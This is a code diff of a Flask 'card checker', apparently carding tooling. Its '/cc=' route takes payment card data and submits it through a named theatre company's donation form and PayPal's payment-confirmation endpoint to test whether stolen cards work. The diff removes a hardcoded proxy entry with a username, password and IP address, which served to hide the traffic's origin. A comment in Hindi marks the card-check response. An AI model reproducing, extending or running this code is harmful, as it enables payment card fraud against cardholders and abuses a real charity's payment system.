@@ -5,12 +5,6 @@ import re
 
 app = Flask(__name__)
 
-# Quantum Proxy REPLACED
-PROXY_CONFIG = {
-    'http': 'http://bcvyjybs:qpc17kptincm@142.111.48.253:7030',
-    'https': 'http://bcvyjybs:qpc17kptincm@142.111.48.253:7030'
-}
-
 @app.route('/cc=<path:card_data>')
 def check_card(card_data):
     try:
@@ -39,7 +33,7 @@ def check_card(card_data):
             }
 
             response = session.get('https://atlanticcitytheatrecompany.com/donations/donate/', 
-                                  headers=headers, proxies=PROXY_CONFIG)
+                                  headers=headers)
 
             prefix_match = re.search(r'give-form-id-prefix" value="([^"]+)"', response.text)
             if prefix_match:
@@ -121,8 +115,7 @@ def check_card(card_data):
                 'https://atlanticcitytheatrecompany.com/wp-admin/admin-ajax.php',
                 params=params,
                 headers=headers,
-                files=files,
-                proxies=PROXY_CONFIG
+                files=files
             )
 
             headers = {
@@ -166,8 +159,7 @@ def check_card(card_data):
             response = session.post(
                 'https://cors.api.paypal.com/v2/checkout/orders/8B515934GC0616145/confirm-payment-source',
                 headers=headers,
-                json=json_data,
-                proxies=PROXY_CONFIG
+                json=json_data
             )
 
             # YAHI TUMHARA CARD CHECK RESPONSE HAI
